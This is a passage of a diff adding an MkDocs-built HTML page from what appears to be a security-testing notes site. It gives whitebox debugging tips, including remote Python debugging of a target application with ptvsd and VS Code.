+<li>This is so you know where you are in the development and to have a "hot" or used CLI already.</li>
+<li>Gives you more control. For example, this is even before you make your first request.get or request.post.</li>
+<li>From other code</li>
+<li>Comment out the requests and other processing at the bottom of each function and def.</li>
+<li>Concentrate on the parameters being passed. Then processing of parameters before being "requested".</li>
+<li>Make sure to print the variable outputs early on.</li>
+</ul>
+<h2 id="remote-debugging">Remote Debugging</h2>
+<ul>
+<li>Find out a way to enable remote debugging on the target application</li>
+<li>Debug with Visual Studio Code for Linux</li>
+<li>Install Extensions such as</li>
+<li>Python</li>
+<li>Install <em>ptvsd</em> (Python Tools for Visual Studio debug) on the target/debugging server<ul>
+<li><code>pip3 install ptvsd</code></li>
+</ul>
+</li>
+<li>Edit whatever file to start <em>ptvsd</em>
+        <div class="language-text highlight"><pre><span></span><code><span id="__span-37-1"><a id="__codelineno-37-1" name="__codelineno-37-1" href="#__codelineno-37-1"></a>        import ptvsd
+</span><span id="__span-37-2"><a id="__codelineno-37-2" name="__codelineno-37-2" href="#__codelineno-37-2"></a>        ptvsd.enable_attach(redirect_output=True)
+</span><span id="__span-37-3"><a id="__codelineno-37-3" name="__codelineno-37-3" href="#__codelineno-37-3"></a>        print(&quot;Now ready to be connected to by the IDE&quot;)
+</span><span id="__span-37-4"><a id="__codelineno-37-4" name="__codelineno-37-4" href="#__codelineno-37-4"></a>        ptvsd.wait_for_attach()
+</span></code></pre></div></li>
+<li>By default, <em>ptvsd</em> will start on <code>5678/tcp</code></li>
+<li>Copy the data/code to local Kali and open the folder with VS Code<ul>
+<li>copy using a tool like <code>rsync</code> or <code>scp -prv ...</code></li>
+</ul>
+</li>
+<li>Start the service on the server  (Depends on the specific app)</li>
+<li>In VS Code -&gt; Debug -&gt; Python -&gt; Remote Attach<ul>
+<li>type in <code>IP Address</code> and <code>Port</code> (5678)</li>
+</ul>
+</li>
+<li>Continue to edit debug json file to match <code>remoteRoot</code> folder to local <code>${workspaceFolder}</code></li>
+<li>Start the Debugger on VS Code ("<em>Run/Play</em>")</li>
+<li>Create a breaking point on the code in VS Code and try to trigger it</li>
+</ul>
+
+  <br>
+    
+
+    <br>
+</div>
+
+<footer class="col-md-12 wm-page-content">
+      <p>
+        <a href="https://github.com/readloud/readloud.github.io/releases/tag/themes/edit/master/docs/web/cloud/whitebox.md"><i class="fa fa-github"></i>
+Edit on GitHub</a>
+      </p>
+  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="https://github.com/noraj/mkdocs-windmill-dark">Windmill Dark</a> theme by Alexandre ZANNI (noraj).</p>
+<p>        ⚠️ The quieter you become, the more you are able to hear 🥷</p>
+</footer>
+
+</body>
+</html>
